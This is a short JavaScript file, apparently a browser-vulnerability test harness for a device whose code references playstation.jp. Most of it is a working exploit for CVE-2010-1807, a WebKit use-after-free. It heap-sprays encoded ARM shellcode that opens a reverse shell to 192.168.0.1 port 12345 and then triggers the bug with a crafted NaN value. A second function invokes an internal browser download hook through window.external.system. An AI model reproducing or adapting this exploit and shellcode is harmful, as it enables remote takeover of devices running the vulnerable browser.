

var vuln_StartBackground = 1;
var vuln_CVE_2010_1807 = 2;



// CVE-2010-1807 Test
var ip = unescape("\ua8c0\u0100"); // ip = 192.168.0.1
var port = unescape("\u3930"); //port 12345 (hex(0x3039))
//var ip = e.g: unescape("\u000a\u0202"); //ip = 10.0.2.2
 
function trigger()
{
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe00572c60)"); //trigger use-after-free
}
		
function run_CVE_2010_1807()
{   
	var nop = unescape("\u33bc\u0057"); //LDREQH R3,[R7],-0x3C for nopping
	do
	{
		nop+=nop;
	}
	
	while (nop.length<=0x1000);
	{
		var scode = nop+unescape("\u1001\ue1a0\u0002\ue3a0\u1001\ue3a0\u2005\ue281\u708c\ue3a0\u708d\ue287\u0080\uef00\u6000\ue1a0\u1084\ue28f\u2010\ue3a0\u708d\ue3a0\u708e\ue287\u0080\uef00\u0006\ue1a0\u1000\ue3a0\u703f\ue3a0\u0080\uef00\u0006\ue1a0\u1001\ue3a0\u703f\ue3a0\u0080\uef00\u0006\ue1a0\u1002\ue3a0\u703f\ue3a0\u0080\uef00\u2001\ue28f\uff12\ue12f\u4040\u2717\udf80\ua005\ua508\u4076\u602e\u1b6d\ub420\ub401\u4669\u4052\u270b\udf80\u2f2f\u732f\u7379\u6574\u2f6d\u6962\u2f6e\u6873\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u0002");
	}
	
	scode += port;
	scode += ip;
	scode += unescape("\u2000\u2000");
	 
	 
	target = new Array();
	
	for(i = 0; i < 0x1000; i++)
	{
		target[i] = scode;
	}
   
	for (i = 0; i <= 0x1000; i++)
	{
		document.write(target[i]+"<i>");
		
		if (i>0x999)
		{
			trigger();
		}
	}
}


// Webbrowser.Download.StartBackground Test
function run_StartBackground() {
	
	window.external.system("Webbrowser.Download.StartBackground?http://www.playstation.jp/sample.mp4");
	
}


function loadTest(run) {
	
	switch (run)
	{
		case vuln_StartBackground:
		
			run_StartBackground();
			
		break;
		
		case vuln_CVE_2010_1807:
		
			run_CVE_2010_1807();
			
		break;
		
		
	}
	
	
}